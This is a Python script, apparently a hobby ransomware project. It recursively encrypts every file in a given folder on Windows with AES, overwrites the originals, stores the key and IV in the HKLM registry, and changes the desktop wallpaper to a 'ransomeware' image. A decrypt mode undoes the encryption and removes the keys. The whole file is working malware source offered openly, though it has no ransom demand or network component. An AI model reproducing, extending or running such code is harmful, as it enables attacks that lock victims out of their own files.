# Imports
from os import urandom , path , listdir
from Crypto.Cipher import AES
import argparse
import winreg as reg
import ctypes

# Consts
enc_key_reg_path = 'encryption_key'
iv_key_reg_path = 'iv'


def set_ransomeware_image():
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\Users\joeyh\OneDrive\Desktop\ransomewareProgram\ransomeware.png", 0)


def reset_picture():
    ctypes.windll.user32.SystemParametersInfoW(20, 0, r"C:\Users\joeyh\OneDrive\תמונות\TranscodedWallpaper.jpg", 0)    


def create_reg_keys(encryption_key, iv):
    newkey = reg.CreateKey(reg.HKEY_LOCAL_MACHINE, r'SYSTEM\encryption')

    # Create encryption key object in reg 
    reg.SetValueEx(newkey, enc_key_reg_path, 0, reg.REG_BINARY, encryption_key)

    # Create iv object in reg
    reg.SetValueEx(newkey, iv_key_reg_path, 0, reg.REG_BINARY, iv)
    reg.CloseKey(newkey)


def read_reg():
    try:
        path = reg.OpenKeyEx(reg.HKEY_LOCAL_MACHINE, r'SYSTEM\encryption')
        encryption_key = reg.QueryValueEx(path, enc_key_reg_path)
        iv = reg.QueryValueEx(path,iv_key_reg_path)
        return encryption_key[0], iv[0]
    except:
        print('no registry values found...')
        return False, False


def Delete_Reg_keys():
    reg.DeleteKey(reg.HKEY_LOCAL_MACHINE, r'SYSTEM\encryption')
    

def decrypt(data):
    
    key, iv = read_reg()

    # Check if key, iv existing
    if(key and iv):
        rev_obj = AES.new(key, AES.MODE_CFB, iv)
        decrypted_data = rev_obj.decrypt(data)
        return decrypted_data
    else:
        print('cant find decryption key, sorry...')
        return False


def decrypt_folder_in_folder(dir_path, dir_name):
    new_path = path.join(dir_path, dir_name)

    # Decrypt files 
    for file in listdir(new_path):
        full_file_path = path.join(new_path, file)

        # File is not dir
        if not path.isdir(full_file_path):
            with open(full_file_path, 'rb') as encrypted_file:
                data = encrypted_file.read()
                decrypted_data = decrypt(data)
            with open(full_file_path, 'wb') as encrypted_file:
                encrypted_file.write(decrypted_data)

        # File is directory -> call this func again with differrent params
        else:
            decrypt_folder_in_folder(new_path, file)
    


def encrypt_single_file(data):
    secret_key, iv = read_reg()

    # Check if key, iv existing
    if(secret_key and iv):
        print('already existing reg values, exiting...')
        return False
    else:
        secret_key = urandom(16)
        iv = urandom(16)
        create_reg_keys(secret_key, iv)
        obj = AES.new(secret_key, AES.MODE_CFB, iv)
        return obj.encrypt(data)


def encrypt_folder(data):
    secret_key, iv = read_reg()

    # Check if key, iv existing
    if(secret_key and iv):
        obj = AES.new(secret_key, AES.MODE_CFB, iv)
        return obj.encrypt(data)

    # Generate new key and iv and encrypt folder
    else:
        secret_key = urandom(16)
        iv = urandom(16)
        create_reg_keys(secret_key, iv)
        obj = AES.new(secret_key, AES.MODE_CFB, iv)
        return obj.encrypt(data)


def encrypt_folder_in_folder(dir_path, dir_name):
    new_path = path.join(dir_path, dir_name)

    # Encrypt files 
    for file in listdir(new_path):
        full_file_path = path.join(new_path, file)

        # File is not dir
        if not path.isdir(full_file_path):
            with open(full_file_path, 'rb') as opened_file:
                data = opened_file.read()
                encrypted_data = encrypt_folder(data)
            with open(full_file_path, 'wb') as opened_file:
                opened_file.write(encrypted_data)

        # File is directory -> call this func again with differrent params
        else:
            encrypt_folder_in_folder(new_path, file)
            

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-e", "--encrypt", action="store_true",help="encrypt a file")
    parser.add_argument("-d", "--decrypt", action="store_true",help="decrypt a file")
    parser.add_argument("-f", "--file", type=str ,help="represent the path of a file")
    parser.add_argument("-fo", "--folder", type=str ,help="represent the path of a folder")
    args = parser.parse_args()
    
    # Check whether --encrypt is active
    if args.encrypt:

        # Check whether --file is active
        if args.file:
            print('encrypting...')
            
            # Read file, encode and encrypt it
            with open(args.file, 'rb') as data_file:
                data = data_file.read()
                encrypted_data = encrypt_single_file(data)

            # Check if the encryption really occured
            if encrypted_data:

                # Write encryption data to original file
                with open(args.file, 'wb') as data_file:
                    data_file.write(encrypted_data)

                # After file encrypted set background image
                set_ransomeware_image()
                    
            else:
                print('encryption failed because there are iv and key files')

        # Check whether --folder is active
        elif args.folder:
            print('encrypting...')

            # Encrypt every file in the folder
            for filename in listdir(args.folder):

                # File is not directory
                if not path.isdir(path.join(args.folder, filename)):
                    with open(path.join(args.folder, filename), 'rb') as file_in_folder:
                        data = file_in_folder.read()
                        encrypted_data = encrypt_folder(data)

                    # Write encryption data to original file
                    with open(path.join(args.folder, filename), 'wb') as file_in_folder:
                        file_in_folder.write(encrypted_data)

                # File is directory
                else:
                    encrypt_folder_in_folder(args.folder, filename)

            # After all files encrypted set background image
            set_ransomeware_image()
        
        else:
            print('please provide file or folder to encrypt...')
        
    # Check whether --decrypt is active
    elif args.decrypt:

        # Check whether --file is active
        if args.file:
            print('decrypting...')

            # Reading encrypted file, decoding and decrypting
            with open(args.file, 'rb') as encrypted_file:
                data = encrypted_file.read()
                decrypted_data = decrypt(data)

            # Decryption succeeded
            if decrypted_data:

                # Writing the decrypting data back to the original file
                with open(args.file, 'wb') as encrypted_file:
                    encrypted_file.write(decrypted_data)

                # Change the background back and delete reg keys
                reset_picture()
                Delete_Reg_keys()

            # Decryption failed
            else:
                print('oops...')

        elif args.folder:
            print('decrypting...')

            # Decrypting all files in folder
            for filename in listdir(args.folder):

                # File is not directory
                if not path.isdir(path.join(args.folder, filename)):
                    with open(path.join(args.folder, filename), 'rb') as file_in_folder:
                        data = file_in_folder.read()
                        decrypted_data = decrypt(data)
                    with open(path.join(args.folder, filename), 'wb') as file_in_folder:
                        file_in_folder.write(decrypted_data)

                # File is directory
                else:
                    decrypt_folder_in_folder(args.folder, filename)

            # Change the background back and delete keys
            reset_picture()
            Delete_Reg_keys()

        # Decrypt without file or folder 
        else:
            print('enter a file pt or folder...')

    # No arguments accepted
    else:
        print('add arguments...')

    

if __name__ == '__main__':
    main()
